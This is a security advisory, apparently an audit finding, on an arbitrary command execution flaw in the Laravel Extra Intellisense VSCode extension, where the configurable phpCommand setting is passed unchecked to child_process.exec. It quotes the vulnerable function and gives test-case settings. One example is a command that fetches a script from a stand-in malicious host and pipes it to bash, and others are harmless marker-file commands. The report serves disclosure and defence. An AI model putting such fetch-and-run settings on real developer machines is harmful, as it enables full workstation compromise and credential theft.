### Vulnerability List

- Vulnerability Name: Arbitrary PHP Code Execution via `phpCommand` Configuration
- Description:
    1. The "Laravel Extra Intellisense" extension for VSCode allows users to configure a custom PHP command via the `LaravelExtraIntellisense.phpCommand` setting. This command is used by the extension to execute PHP code within the user's Laravel project to gather data for autocompletion features.
    2. A malicious actor could trick a developer into configuring a malicious `phpCommand`. This could be achieved through social engineering, such as suggesting a seemingly harmless configuration change in a blog post, tutorial, or during a support interaction.
    3. Once a malicious `phpCommand` is configured, any operation performed by the extension that triggers PHP code execution (which is the core functionality of the extension, happening automatically and periodically) will execute the attacker-controlled command.
    4. For example, an attacker could convince a user to set `LaravelExtraIntellisense.phpCommand` to execute system commands instead of PHP, like `bash -c "curl malicious.site | bash"`.
    5. When the extension attempts to gather autocompletion data, it will execute this malicious command, leading to arbitrary command execution on the developer's machine.
- Impact:
    - Critical. Successful exploitation allows the attacker to execute arbitrary commands on the developer's machine with the same privileges as VSCode. This can lead to:
        - Full compromise of the developer's workstation.
        - Theft of source code, credentials, and other sensitive information.
        - Installation of malware, backdoors, or ransomware.
        - Further attacks on internal networks or systems accessible from the developer's machine.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None. The extension directly uses the configured `phpCommand` without any validation or sanitization. The "Security Note" in the README.md warns users about potential errors but does not explicitly address the risk of malicious configurations leading to code execution.
    - The README.md contains a "Security Note" that mentions "This extension runs your Laravel application automatically and periodically to get the information needed to provide autocomplete." and "So if you have any unknown errors in your log make sure the extension not causing it." and "Also if you writing any sensitive code in your service providers, disable the extension temporarily to prevent unwanted application executing." but this is only a weak warning and not a mitigation.
- Missing Mitigations:
    - Input validation and sanitization for the `phpCommand` configuration.
    - Restricting the `phpCommand` to only execute `php` interpreter and preventing execution of other system commands.
    - Displaying a prominent security warning to the user upon installation or when the `phpCommand` configuration is modified, highlighting the risks of using custom commands and advising to only use trusted configurations.
    - Implementing a default `phpCommand` that is safe and sufficient for most use cases, reducing the need for users to modify this setting.
- Preconditions:
    - The user must have the "Laravel Extra Intellisense" extension installed in VSCode.
    - The user must configure the `LaravelExtraIntellisense.phpCommand` setting with a malicious command provided by the attacker.
    - The extension must be activated and running within a Laravel project.
    - An action that triggers the extension to execute PHP code must be performed (e.g., opening a PHP or Blade file, triggering autocompletion).
- Source Code Analysis:
    - File: `src/helpers.ts`
    - Function: `runPhp(code: string, description: string|null = null)`
    - Line: `let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";`
    - Line: `let command = commandTemplate.replace("{code}", code);`
    - Line: `cp.exec(command, ...)`

    ```typescript
    static async runPhp(code: string, description: string|null = null) : Promise<string> {
        code = code.replace(/\"/g, "\\\"");
        if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
            code = code.replace(/\$/g, "\\$");
            code = code.replace(/\\\\'/g, '\\\\\\\\\'');
            code = code.replace(/\\\\"/g, '\\\\\\\\\"');
        }
        let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\""; // Vulnerable line: Retrieves phpCommand from configuration
        let command = commandTemplate.replace("{code}", code); // Vulnerable line: Constructs command by simply replacing {code}
        let out = new Promise<string>(function (resolve, error) {
            if (description != null) {
                Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description);
            }

            cp.exec(command, // Vulnerable line: Executes the command using child_process.exec
                { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
                function (err, stdout, stderr) {
                    if (err == null) {
                        if (description != null) {
                            Helpers.outputChannel?.info("Laravel Extra Intellisense Resolved: " + description);
                        }
                        resolve(stdout);
                    } else {
                        const errorOutput = stderr.length > 0 ? stderr : stdout;
                        Helpers.outputChannel?.error("Laravel Extra Intellisense Error:\n " + (description ?? '') + '\n\n' + errorOutput);
                        Helpers.showErrorPopup();
                        error(errorOutput);
                    }
                }
            );
        });
        return out;
    }
    ```
    - The `runPhp` function retrieves the `phpCommand` from the user configuration without any validation.
    - It then directly substitutes the `{code}` placeholder in the configured command with the PHP code to be executed.
    - Finally, it uses `child_process.exec` to execute the constructed command. This allows execution of arbitrary commands if the user configures `phpCommand` maliciously.

- Security Test Case:
    1. Open VSCode with a Laravel project.
    2. Go to VSCode settings (File -> Preferences -> Settings -> Settings or Code -> Settings -> Settings on macOS).
    3. Search for "Laravel Extra Intellisense Php Command".
    4. Modify the `LaravelExtraIntellisense: Php Command` setting to the following malicious command:
        ```bash
        bash -c "touch /tmp/pwned_by_laravel_intellisense"
        ```
        Alternatively, for a more visible impact, you can use:
        ```bash
        bash -c "mkdir /tmp/laravel_intellisense_pwned && echo 'You have been PWNED by Laravel Intellisense Extension' > /tmp/laravel_intellisense_pwned/PWNED.txt && open /tmp/laravel_intellisense_pwned/PWNED.txt"
        ```
        or on Windows (PowerShell):
        ```powershell
        powershell -c "powershell -c "New-Item -ItemType directory -Path C:\pwned_by_laravel_intellisense; New-Item -ItemType file -Path C:\pwned_by_laravel_intellisense\PWNED.txt -Value 'You have been PWNED by Laravel Intellisense Extension'; Start-Process C:\pwned_by_laravel_intellisense\PWNED.txt""
        ```
    5. Open any PHP or Blade file in the Laravel project, or trigger any autocompletion feature provided by the extension. This will cause the extension to execute PHP code using the malicious `phpCommand`.
    6. Verify that the malicious command has been executed. For the `touch` command, check if the file `/tmp/pwned_by_laravel_intellisense` has been created. For the `mkdir` and `echo` command, check if the directory `/tmp/laravel_intellisense_pwned` and the file `/tmp/laravel_intellisense_pwned/PWNED.txt` with the expected content have been created and opened. On Windows, check for `C:\pwned_by_laravel_intellisense` directory and file.
    7. This confirms that arbitrary commands can be executed by configuring a malicious `phpCommand`.
